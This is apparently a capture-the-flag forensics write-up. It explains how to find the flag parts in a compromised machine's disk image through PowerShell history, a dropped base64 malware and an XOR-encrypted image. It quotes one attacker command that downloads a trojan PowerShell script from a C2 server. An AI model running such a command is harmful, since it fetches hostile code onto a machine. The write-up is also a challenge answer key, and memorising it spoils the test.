| Description    | The forensics team recently recovered a disk image from a compromised machine. Your job as an intern is to help uncover what the attacker had done to the compromised machine and what artifacts you can dig up for the final report. The attacker searched up some suspicious stuff on the Internet after infiltrating the machine, I wonder what was the attacker looking for? |

1) A password-protected ZIP file can be obtained from the Documents folder. Since the question mentioned the attacker is
   a fan of Powershell, the password can be obtained there.

1) The Powershell history will show that a malicious Powershell script is downloaded from a C2. Analyzing the powershell
   script, the first part of the flag can be identified.

   `Invoke-WebRequest "http://192.168.1.73:8000/trojan.ps1" -OutFile C:\Users\warlocksmurf\Downloads\trojan.ps1`

   ![sol5](docs/sol5.png)

2) The Powershell script also dropped a base64 encoded malware to the Pictures folder. Going to the folder, an encrypted
   image can be identified with the malware. Analyzing the malware, it encrypted the image with XOR 35 and placed the
   third part of the flag in Temp folder.

   ![sol6](docs/sol6.png)

   ![sol7](docs/sol7.png)

3) The third part of the flag is a simple base64 and ROT13 encoded text.
